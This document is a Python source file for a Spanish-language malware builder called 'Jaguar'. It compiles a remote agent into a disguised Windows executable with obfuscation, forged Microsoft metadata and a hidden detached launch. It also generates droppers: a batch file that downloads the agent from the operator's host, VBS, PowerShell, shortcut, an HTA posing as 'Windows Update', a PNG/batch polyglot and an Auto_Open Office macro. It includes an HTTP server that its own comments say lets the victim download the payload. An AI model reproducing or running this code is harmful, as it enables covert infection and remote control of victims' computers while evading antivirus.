# -*- coding: utf-8 -*-
"""Constructor de payloads Jaguar (pipeline avanzado + PyArmor).

Cadena de ofuscación/compilación:
  1) PyArmor  -> ofusca el agente (si está instalado)
  2) Nuitka   -> compila (sin UPX, metadatos legítimos)   [recomendado]
  3) PyInstaller -> fallback (--noupx)

FIX 1 (_MEI): el payload se auto-desprende (spawn detached + exit). En --onefile
el hijo DEBE lanzarse con entorno limpio (PYINSTALLER_RESET_ENVIRONMENT=1 y sin
_PYI_* / _MEIPASS2); si no, hereda las variables del bootloader del padre, se
ejecuta desde la carpeta _MEI del padre y muere al borrarla este. Ver _entry().

FIX 2 (WinError 32): cada build usa una carpeta de trabajo ÚNICA para no chocar
con el RuntimeBroker.pkg bloqueado de la build anterior (antivirus / instancia
viva). Además se cierran instancias del payload y se reintenta. Ver generar_exe().
"""
import os
import sys
import shutil
import stat
import struct
import zlib
import subprocess
import tempfile
import functools
import time
from http.server import SimpleHTTPRequestHandler, ThreadingHTTPServer

ES_WIN = sys.platform.startswith("win")
CREATE_NO_WINDOW = 0x08000000


class Constructor:
    def __init__(self, host, puerto, log=None, nombre="RuntimeBroker",
                 icono=None, upx=None, certificado=None, contrasena_cert=None,
                 compilador="auto", lto=False, mingw=False, usar_pyarmor=False,
                 matar_payload=True):
        self.host = (host or "127.0.0.1").strip()
        self.puerto = str(puerto or "8000").strip()
        self.log = log or (lambda t: None)
        self.nombre = (nombre or "RuntimeBroker").strip()
        self.icono = icono or None
        self.upx = upx or None
        self.certificado = certificado or None
        self.contrasena_cert = contrasena_cert or None
        self.compilador = (compilador or "auto").lower()   # auto | nuitka | pyinstaller
        self.lto = bool(lto)
        self.mingw = bool(mingw)
        self.usar_pyarmor = bool(usar_pyarmor)
        self.matar_payload = bool(matar_payload)

        self.base = os.path.dirname(os.path.abspath(__file__))
        self.raiz = os.path.dirname(os.path.dirname(self.base))
        self.dist = os.path.join(self.raiz, "dist")
        self.build = os.path.join(self.raiz, "build_jaguar")
        self.agente = self._localizar_agente()
        self.fallback = self._ip_local()
        self._http = None
        if not self.agente:
            raise FileNotFoundError("No se encontró agente/agente.py — revisa la estructura del proyecto")
        os.makedirs(self.dist, exist_ok=True)

    # ------------------------------------------------------------------ util
    def _localizar_agente(self):
        cands = [
            os.path.join(self.raiz, "agente", "agente.py"),
            os.path.join(self.raiz, "agente.py"),
            os.path.join(self.raiz, "jaguar", "agente", "agente.py"),
            os.path.join(self.base, "agente.py"),
        ]
        for c in cands:
            if os.path.isfile(c):
                self.log(f"[builder] agente.py encontrado en: {c}")
                return c
        self.log(f"[builder] ERROR: no encontré agente.py (busqué en {self.raiz})")
        return None

    @staticmethod
    def _ip_local():
        import socket
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        try:
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
        except Exception:
            return ""
        finally:
            s.close()

    def _out(self, nombre):
        return os.path.join(self.dist, nombre)

    def _escribir(self, ruta, texto, binario=False):
        modo = "wb" if binario else "w"
        kwargs = {} if binario else {"encoding": "utf-8", "newline": ""}
        with open(ruta, modo, **kwargs) as f:
            f.write(texto)
        self.log(f"[builder] creado: {os.path.basename(ruta)}")
        return ruta

    def _copiar_agente(self):
        try:
            if os.path.isfile(self.agente):
                shutil.copy2(self.agente, self._out("agente.py"))
        except Exception as e:
            self.log(f"[builder] no pude copiar agente.py: {e}")

    def _args(self):
        return f'{self.host} {self.puerto} {self.fallback}'

    @staticmethod
    def _sello():
        return f"{time.strftime('%Y%m%d_%H%M%S')}_{os.getpid()}"

    def _rmtree_robusto(self, ruta, intentos=4):
        """Borra una carpeta aunque haya archivos de solo-lectura/bloqueados."""
        if not ruta or not os.path.isdir(ruta):
            return True

        def _forzar(func, path):
            try:
                os.chmod(path, stat.S_IWRITE | stat.S_IREAD)
                func(path)
            except Exception:
                pass

        for _ in range(intentos):
            try:
                if sys.version_info >= (3, 12):
                    shutil.rmtree(ruta, onexc=lambda f, p, e: _forzar(f, p))
                else:
                    shutil.rmtree(ruta, onerror=lambda f, p, e: _forzar(f, p))
            except Exception:
                pass
            if not os.path.isdir(ruta):
                return True
            time.sleep(0.6)
        return not os.path.isdir(ruta)

    def _matar_payload(self):
        """Cierra instancias en ejecución del exe (suelen bloquear archivos)."""
        if not ES_WIN:
            return
        exe = self.nombre + ".exe"
        try:
            r = subprocess.run(["tasklist", "/FI", f"IMAGENAME eq {exe}", "/NH"],
                               capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW)
            if exe.lower() in (r.stdout or "").lower():
                subprocess.run(["taskkill", "/IM", exe, "/F", "/T"],
                               capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW)
                self.log(f"[builder] cerradas instancias de {exe} antes de compilar")
                time.sleep(0.8)
        except Exception as e:
            self.log(f"[builder] aviso al comprobar procesos: {e}")

    def _limpiar_builds_viejos(self, conservar=()):
        try:
            for n in os.listdir(self.build):
                if n.startswith(("work_", "dist_tmp_")) and n not in conservar:
                    self._rmtree_robusto(os.path.join(self.build, n))
        except Exception:
            pass

    # ------------------------------------------------------------------ entry
    def _entry(self):
        """_entry.py del .exe.

        El detach (spawn + exit) es necesario para que el payload no quede atado
        a la consola/lanzador. El punto CRÍTICO es lanzar el hijo con
        PYINSTALLER_RESET_ENVIRONMENT=1 y sin _PYI_* / _MEIPASS2, para que el
        bootloader del hijo extraiga su PROPIA carpeta _MEI y no herede la del
        padre (que este borra al salir).
        """
        return (
            "import os, sys, subprocess\n"
            "sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))\n"
            f"_HOST = {self.host!r}\n"
            f"_PORT = {self.puerto!r}\n"
            f"_HOST2 = {self.fallback!r}\n"
            "os.environ.setdefault('JAGUAR_HOST', _HOST)\n"
            "os.environ.setdefault('JAGUAR_PORT', _PORT)\n"
            "os.environ.setdefault('JAGUAR_HOST2', _HOST2)\n"
            "DETACHED_PROCESS = 0x00000008\n"
            "CREATE_NEW_PROCESS_GROUP = 0x00000200\n"
            "CREATE_NO_WINDOW = 0x08000000\n"
            "def _entorno_limpio():\n"
            "    env = os.environ.copy()\n"
            "    for _k in list(env):\n"
            "        if _k.startswith('_PYI_') or _k in ('_MEIPASS', '_MEIPASS2'):\n"
            "            env.pop(_k, None)\n"
            "    env['PYINSTALLER_RESET_ENVIRONMENT'] = '1'\n"
            "    return env\n"
            "if sys.platform.startswith('win') and '--jaguar-detached' not in sys.argv:\n"
            "    subprocess.Popen(\n"
            "        [sys.executable, '--jaguar-detached', _HOST, _PORT],\n"
            "        env=_entorno_limpio(),\n"
            "        creationflags=DETACHED_PROCESS | CREATE_NEW_PROCESS_GROUP | CREATE_NO_WINDOW,\n"
            "        close_fds=True)\n"
            "    sys.exit(0)\n"
            "sys.argv = [sys.argv[0], _HOST, _PORT, _HOST2]\n"
            "import agente_jaguar as agente\n"
            "agente.main()\n"
        )

    # ------------------------------------------------------------------ detect
    @staticmethod
    def _tiene_nuitka():
        try:
            r = subprocess.run([sys.executable, "-m", "nuitka", "--version"],
                               capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW)
            return r.returncode == 0
        except Exception:
            return False

    @staticmethod
    def _tiene_pyarmor():
        try:
            r = subprocess.run([sys.executable, "-m", "pyarmor.cli", "--version"],
                               capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW)
            return r.returncode == 0
        except Exception:
            return False

    # ------------------------------------------------------------------ pyarmor
    def _limpiar_pyarmor(self):
        for n in os.listdir(self.build):
            if n.startswith("pyarmor_runtime"):
                self._rmtree_robusto(os.path.join(self.build, n))
        self._rmtree_robusto(os.path.join(self.build, "pyarmor_out"))

    def _obfuscar_pyarmor(self):
        """Ofusca agente_jaguar.py con PyArmor dentro de self.build.
        Devuelve el nombre del paquete runtime (o None si falla)."""
        self._limpiar_pyarmor()
        src = os.path.join(self.build, "agente_jaguar.py")
        if not os.path.isfile(src):
            return None
        out = os.path.join(self.build, "pyarmor_out")
        intentos = (
            ["gen", "-O", out, src],
            ["gen", "--output=" + out, src],
        )
        ok = False
        for args in intentos:
            try:
                proc = subprocess.run([sys.executable, "-m", "pyarmor.cli"] + args,
                                      cwd=self.build, capture_output=True, text=True,
                                      creationflags=CREATE_NO_WINDOW)
            except Exception as e:
                self.log(f"[builder] PyArmor excepción: {e}")
                continue
            if proc.returncode == 0 and os.path.isdir(out):
                ok = True
                break
            self.log(f"[builder] PyArmor falló (rc={proc.returncode}): "
                     + ((proc.stderr or proc.stdout or "").strip()[-500:]))
        if not ok:
            return None

        runtime = None
        for name in os.listdir(out):
            p = os.path.join(out, name)
            if name.startswith("pyarmor_runtime") and os.path.isdir(p):
                runtime = name
                shutil.copytree(p, os.path.join(self.build, name), dirs_exist_ok=True)
            elif name == "agente_jaguar.py":
                shutil.copy2(p, src)
        if runtime:
            self.log(f"[builder] PyArmor OK (runtime={runtime})")
        return runtime

    # ------------------------------------------------------------------ exe
    def generar_exe(self):
        try:
            if not self.agente or not os.path.isfile(self.agente):
                self.log("[builder] ERROR exe: falta agente.py")
                return None
            os.makedirs(self.build, exist_ok=True)

            # Cierra instancias vivas (evita WinError 32 sobre archivos de build)
            if self.matar_payload:
                self._matar_payload()

            shutil.copy2(self.agente, os.path.join(self.build, "agente_jaguar.py"))
            self._escribir(os.path.join(self.build, "_entry.py"), self._entry())

            runtime = None
            if self.usar_pyarmor:
                if self._tiene_pyarmor():
                    runtime = self._obfuscar_pyarmor()
                else:
                    self.log("[builder] PyArmor no instalado -> sigo sin ofuscar")

            # Carpetas de trabajo ÚNICAS por build (clave contra WinError 32)
            sello = self._sello()
            work = os.path.join(self.build, "work_" + sello)
            dist_tmp = os.path.join(self.build, "dist_tmp_" + sello)
            self._rmtree_robusto(work)
            self._rmtree_robusto(dist_tmp)
            os.makedirs(work, exist_ok=True)
            os.makedirs(dist_tmp, exist_ok=True)

            origen = None
            if self.compilador in ("auto", "nuitka"):
                if self._tiene_nuitka():
                    origen = self._compilar_nuitka(dist_tmp, work, runtime)
                else:
                    self.log("[builder] Nuitka no instalado -> PyInstaller")
            if not origen:
                origen = self._compilar_pyinstaller(dist_tmp, work, runtime)
            if not origen or not os.path.isfile(origen):
                self.log("[builder] ERROR exe: no se produjo salida")
                return None

            destino = self._colocar_exe(origen)
            self._firmar(destino)
            self.log(f"[builder] exe listo: {os.path.basename(destino)}")

            self._limpiar_builds_viejos(conservar=(os.path.basename(work),
                                                   os.path.basename(dist_tmp)))
            return destino
        except Exception as e:
            self.log(f"[builder] ERROR exe: {e}")
            return None

    def _nuitka_cmd(self, dist_tmp, extra, runtime):
        cmd = [sys.executable, "-m", "nuitka",
               "--onefile",
               "--assume-yes-for-downloads",
               "--remove-output",
               "--windows-console-mode=disable",
               "--enable-plugin=numpy",
               "--include-package=PIL",
               "--include-package=cv2",
               "--include-module=winreg",
               "--include-module=agente_jaguar",
               "--company-name=Microsoft Corporation",
               "--product-name=Windows",
               f"--file-description={self.nombre}",
               "--file-version=1.0.0.0",
               "--product-version=1.0.0.0",
               "--copyright=Microsoft Corporation",
               f"--output-filename={self.nombre}.exe",
               f"--output-dir={dist_tmp}"]
        if runtime:
            cmd += [f"--include-package={runtime}",
                    f"--include-package-data={runtime}"]
        if self.lto:
            cmd.append("--lto=yes")
        if self.icono and os.path.isfile(self.icono):
            cmd.append(f"--windows-icon-from-ico={os.path.abspath(self.icono)}")
        cmd += list(extra)
        cmd.append("_entry.py")
        return cmd

    def _correr_stream(self, cmd, cwd):
        """Ejecuta un comando mostrando la salida en vivo en el log."""
        self.log("[builder] $ " + " ".join(str(c) for c in cmd))
        p = subprocess.Popen(cmd, cwd=cwd, stdout=subprocess.PIPE,
                             stderr=subprocess.STDOUT, text=True,
                             encoding="utf-8", errors="replace", bufsize=1,
                             creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
        ultimas = []
        for ln in p.stdout:
            ln = ln.rstrip()
            if not ln:
                continue
            ultimas.append(ln)
            del ultimas[:-25]
            if any(k in ln for k in ("Nuitka", "Compiling", "Scons", "gcc",
                                     "cl.exe", "link.exe", "Progress", "error",
                                     "Error", "download", "cache", "backend")):
                self.log("[nuitka] " + ln)
        p.wait()
        return p.returncode, "\n".join(ultimas)

    def _compilar_nuitka(self, dist_tmp, work, runtime):
        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
        intentos = [["--mingw64"]] if self.mingw else [[], ["--mingw64"]]
        for extra in intentos:
            self.log(f"[builder] compilando con Nuitka {extra or '[MSVC]'}... (varios minutos)")
            try:
                rc, cola = self._correr_stream(
                    self._nuitka_cmd(dist_tmp, extra, runtime), self.build)
            except Exception as e:
                self.log(f"[builder] Nuitka excepción: {e}")
                continue
            if rc == 0 and os.path.isfile(exe):
                return exe
            self.log("[builder] Nuitka falló:\n" + cola[-1500:])
        return None

    def _compilar_pyinstaller(self, dist_tmp, work, runtime, intentos=3):
        exe = os.path.join(dist_tmp, self.nombre + (".exe" if ES_WIN else ""))
        salida = ""
        for i in range(intentos):
            cmd = [sys.executable, "-m", "PyInstaller", "--noconfirm",
                   "--onefile", "--noconsole", "--clean",
                   "--name", self.nombre,
                   "--distpath", dist_tmp,
                   "--workpath", work,
                   "--specpath", work,
                   "--hidden-import", "PIL",
                   "--hidden-import", "PIL.Image",
                   "--hidden-import", "PIL.ImageGrab",
                   "--hidden-import", "cv2",
                   "--hidden-import", "winreg",
                   "--paths", self.build]
            if runtime:
                cmd += ["--collect-all", runtime]
            if self.icono and os.path.isfile(self.icono):
                cmd += ["--icon", os.path.abspath(self.icono)]
            if self.upx and os.path.isdir(self.upx):
                cmd += ["--upx-dir", os.path.abspath(self.upx)]
            else:
                cmd += ["--noupx"]
            cmd += ["_entry.py"]

            self.log(f"[builder] compilando con PyInstaller (intento {i + 1}/{intentos})...")
            try:
                proc = subprocess.run(cmd, cwd=self.build, capture_output=True, text=True,
                                      creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
            except Exception as e:
                self.log(f"[builder] PyInstaller excepción: {e}")
                proc = None
            salida = ((proc.stderr or "") + "\n" + (proc.stdout or "")) if proc else ""

            if proc is not None and proc.returncode == 0 and os.path.isfile(exe):
                return exe

            if i < intentos - 1:
                self.log("[builder] fallo de build (posible archivo bloqueado), reintentando...")
                self._rmtree_robusto(work)
                self._rmtree_robusto(dist_tmp)
                os.makedirs(work, exist_ok=True)
                os.makedirs(dist_tmp, exist_ok=True)
                time.sleep(1.5)

        self.log("[builder] ERROR PyInstaller:\n" + salida[-1800:])
        return None

    def _colocar_exe(self, origen, intentos=5):
        ext = ".exe" if ES_WIN else ""
        for i in range(intentos):
            nombre = self.nombre + (ext if i == 0 else f"_{i + 1}{ext}")
            destino = os.path.join(self.dist, nombre)
            try:
                if os.path.isfile(destino):
                    try:
                        os.replace(origen, destino)
                    except PermissionError:
                        try:
                            os.remove(destino + ".old")
                        except OSError:
                            pass
                        os.rename(destino, destino + ".old")
                        os.replace(origen, destino)
                else:
                    os.replace(origen, destino)
                return destino
            except (PermissionError, OSError):
                continue
        destino = os.path.join(self.dist, f"{self.nombre}_{int(time.time())}{ext}")
        shutil.copy2(origen, destino)
        return destino

    def _firmar(self, exe):
        if not (ES_WIN and self.certificado and os.path.isfile(self.certificado)):
            return
        if not shutil.which("signtool"):
            self.log("[builder] signtool no encontrado, salto firma")
            return
        cmd = ["signtool", "sign", "/f", os.path.abspath(self.certificado),
               "/fd", "SHA256", "/tr", "http://timestamp.digicert.com", "/td", "SHA256"]
        if self.contrasena_cert:
            cmd += ["/p", self.contrasena_cert]
        cmd += [exe]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
            self.log("[builder] firmado OK" if r.returncode == 0
                     else "[builder] firma falló: " + (r.stderr or "")[-400:])
        except Exception as e:
            self.log(f"[builder] ERROR firma: {e}")

    # ------------------------------------------------------------------ bat
    def generar_bat(self):
        self._copiar_agente()
        bat = (
            "@echo off\r\n"
            'cd /d "%~dp0"\r\n'
            'if not exist "agente.py" (\r\n'
            '  powershell -NoProfile -Command "try{Invoke-WebRequest -UseBasicParsing '
            f"'http://{self.host}:8080/agente.py' -OutFile 'agente.py'}}catch{{}}\\\"\\r\\n"
            ')\r\n'
            f'start "" pythonw "agente.py" {self._args()}\r\n'
            "exit\r\n"
        )
        return self._escribir(self._out(self.nombre + ".bat"), bat)

    # ------------------------------------------------------------------ vbs
    def generar_vbs(self):
        self._copiar_agente()
        vbs = (
            'Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
            'dir = fso.GetParentFolderName(WScript.ScriptFullName)\r\n'
            'Set sh = CreateObject("WScript.Shell")\r\n'
            'sh.CurrentDirectory = dir\r\n'
            f'sh.Run "pythonw """ & dir & "\\agente.py"" {self._args()}", 0, False\r\n'
        )
        return self._escribir(self._out(self.nombre + ".vbs"), vbs)

    # ------------------------------------------------------------------ ps1
    def generar_ps1(self):
        self._copiar_agente()
        ps1 = (
            '$dir = Split-Path -Parent $MyInvocation.MyCommand.Path\r\n'
            'Set-Location $dir\r\n'
            f'Start-Process -WindowStyle Hidden -FilePath pythonw '
            f'-ArgumentList \'"agente.py" {self._args()}\' -WorkingDirectory $dir\r\n'
        )
        return self._escribir(self._out(self.nombre + ".ps1"), ps1)

    # ------------------------------------------------------------------ lnk
    def generar_lnk(self):
        self._copiar_agente()
        destino = self._out(self.nombre + ".lnk")
        carpeta = self.dist
        try:
            import win32com.client  # type: ignore
            sh = win32com.client.Dispatch("WScript.Shell")
            lnk = sh.CreateShortCut(destino)
            lnk.TargetPath = "pythonw.exe"
            lnk.Arguments = f'"agente.py" {self._args()}'
            lnk.WorkingDirectory = carpeta
            lnk.WindowStyle = 7
            lnk.Save()
            self.log(f"[builder] creado: {os.path.basename(destino)}")
            return destino
        except Exception:
            pass
        if not (ES_WIN and shutil.which("cscript")):
            self.log("[builder] lnk: sin pywin32 ni cscript, genero .url como respaldo")
            return self._escribir(self._out(self.nombre + ".url"),
                                  f"[InternetShortcut]\nURL=file:///{self.agente}\n")
        vbs = os.path.join(tempfile.gettempdir(), "jaguar_lnk.vbs")
        contenido = (
            'Set sh = CreateObject("WScript.Shell")\r\n'
            f'Set l = sh.CreateShortcut("{destino}")\r\n'
            'l.TargetPath = "pythonw.exe"\r\n'
            f'l.Arguments = """agente.py"" {self._args()}"\r\n'
            f'l.WorkingDirectory = "{carpeta}"\r\n'
            'l.WindowStyle = 7\r\n'
            'l.Save\r\n'
        )
        with open(vbs, "w", encoding="utf-8") as f:
            f.write(contenido)
        subprocess.run(["cscript", "//nologo", vbs], capture_output=True, text=True,
                       creationflags=CREATE_NO_WINDOW if ES_WIN else 0)
        self.log(f"[builder] creado: {os.path.basename(destino)}")
        return destino

    # ------------------------------------------------------------------ hta
    def generar_hta(self):
        self._copiar_agente()
        hta = (
            '<html><head><title>Windows Update</title>\r\n'
            '<HTA:APPLICATION ID="j" BORDER="none" SHOWINTASKBAR="no" '
            'WINDOWSTATE="minimize" SINGLEINSTANCE="yes" />\r\n'
            '<script language="VBScript">\r\n'
            'Sub Window_OnLoad\r\n'
            '  Set fso = CreateObject("Scripting.FileSystemObject")\r\n'
            '  dir = fso.GetParentFolderName(js)\r\n'
            '  Set sh = CreateObject("WScript.Shell")\r\n'
            '  sh.CurrentDirectory = dir\r\n'
            f'  sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
            '  window.close\r\n'
            'End Sub\r\n'
            '</script></head><body></body></html>\r\n'
        )
        return self._escribir(self._out(self.nombre + ".hta"), hta)

    # ------------------------------------------------------------------ png polyglot
    def generar_png_polyglot(self):
        self._copiar_agente()
        png = self._png_minimo()
        bat = ("\r\n@echo off\r\n"
               'cd /d "%~dp0"\r\n'
               f'start "" pythonw "agente.py" {self._args()}\r\n').encode("utf-8")
        self._escribir(self._out(self.nombre + ".png"), png + bat, binario=True)
        self._escribir(self._out(self.nombre + ".png.cmd"), png + bat, binario=True)
        return self._out(self.nombre + ".png")

    @staticmethod
    def _png_minimo():
        def chunk(tipo, data):
            return (struct.pack(">I", len(data)) + tipo + data +
                    struct.pack(">I", zlib.crc32(tipo + data) & 0xffffffff))
        sig = b"\x89PNG\r\n\x1a\n"
        ihdr = struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0)
        idat = zlib.compress(b"\x00\xff\x00\x00")
        return sig + chunk(b"IHDR", ihdr) + chunk(b"IDAT", idat) + chunk(b"IEND", b"")

    # ------------------------------------------------------------------ pdf
    def generar_pdf(self):
        self._escribir(self._out(self.nombre + ".pdf"), self._pdf_minimo(""), binario=True)
        return self._out(self.nombre + ".pdf")

    @staticmethod
    def _pdf_minimo(texto):
        objs = [
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 320 120] "
            b"/Contents 4 0 R /Resources << /Font << /F1 5 0 R >> >> >>",
            None,
            b"<< /Type /Font /Subtype /Type1 /BaseFont /Courier >>",
        ]
        stream = b"BT /F1 10 Tf 12 60 Td (" + texto.encode("latin-1", "replace") + b") Tj ET"
        objs[3] = (b"<< /Length " + str(len(stream)).encode() + b" >>\nstream\n" +
                   stream + b"\nendstream")
        out = bytearray(b"%PDF-1.4\n")
        offsets = []
        for i, o in enumerate(objs, 1):
            offsets.append(len(out))
            out += str(i).encode() + b" 0 obj\n" + o + b"\nendobj\n"
        xref = len(out)
        out += b"xref\n0 " + str(len(objs) + 1).encode() + b"\n0000000000 65535 f \n"
        for off in offsets:
            out += ("%010d 00000 n \n" % off).encode()
        out += (b"trailer\n<< /Size " + str(len(objs) + 1).encode() +
                b" /Root 1 0 R >>\nstartxref\n" + str(xref).encode() + b"\n%%EOF")
        return bytes(out)

    # ------------------------------------------------------------------ macro
    def generar_macro(self):
        self._copiar_agente()
        macro = (
            'Sub Auto_Open()\r\n'
            '    Dim sh As Object, dir As String\r\n'
            '    Set sh = CreateObject("WScript.Shell")\r\n'
            '    dir = ThisWorkbook.Path\r\n'
            f'    sh.CurrentDirectory = dir\r\n'
            f'    sh.Run "pythonw ""agente.py"" {self._args()}", 0, False\r\n'
            'End Sub\r\n'
        )
        return self._escribir(self._out(self.nombre + "_macro.bas"), macro)

    # ------------------------------------------------------------------ todo
    def generar_todo(self, tipos=None):
        tipos = tipos or ["exe", "bat", "vbs", "ps1", "lnk", "hta", "png", "pdf", "macro"]
        res = {}
        mapa = {
            "exe": self.generar_exe,
            "bat": self.generar_bat,
            "vbs": self.generar_vbs,
            "ps1": self.generar_ps1,
            "lnk": self.generar_lnk,
            "hta": self.generar_hta,
            "png": self.generar_png_polyglot,
            "pdf": self.generar_pdf,
            "macro": self.generar_macro,
        }
        for t in tipos:
            fn = mapa.get(t)
            if not fn:
                continue
            try:
                res[t] = fn()
            except Exception as e:
                self.log(f"[builder] ERROR generando {t}: {e}")
                res[t] = None
        return res

    # ------------------------------------------------------------------ http
    def servir_http(self, puerto=8080, directorio=None):
        if self._http is None:
            self._http = Servidor(puerto=puerto, log=self.log)
        return self._http.iniciar(directorio or self.dist)

    def detener_http(self):
        if self._http:
            self._http.detener()


# ============================================================ SERVIDOR ======
class _Handler(SimpleHTTPRequestHandler):
    def __init__(self, *a, directorio=None, **kw):
        super().__init__(*a, directory=directorio, **kw)

    def log_message(self, *a):
        pass


class Servidor:
    """Sirve la carpeta dist para que la víctima descargue el payload por HTTP."""

    def __init__(self, puerto=8080, log=None):
        self.puerto = int(puerto)
        self.log = log or (lambda t: None)
        self.httpd = None
        self.hilo = None

    def iniciar(self, directorio):
        self.detener()
        handler = functools.partial(_Handler, directorio=directorio)
        self.httpd = ThreadingHTTPServer(("0.0.0.0", self.puerto), handler)
        self.hilo = __import__("threading").Thread(target=self.httpd.serve_forever, daemon=True)
        self.hilo.start()
        self.log(f"[servidor] sirviendo {directorio} en http://0.0.0.0:{self.puerto}")
        return f"http://0.0.0.0:{self.puerto}"

    def detener(self):
        try:
            if self.httpd:
                self.httpd.shutdown()
                self.httpd.server_close()
        except Exception:
            pass
        self.httpd = None
        self.hilo = None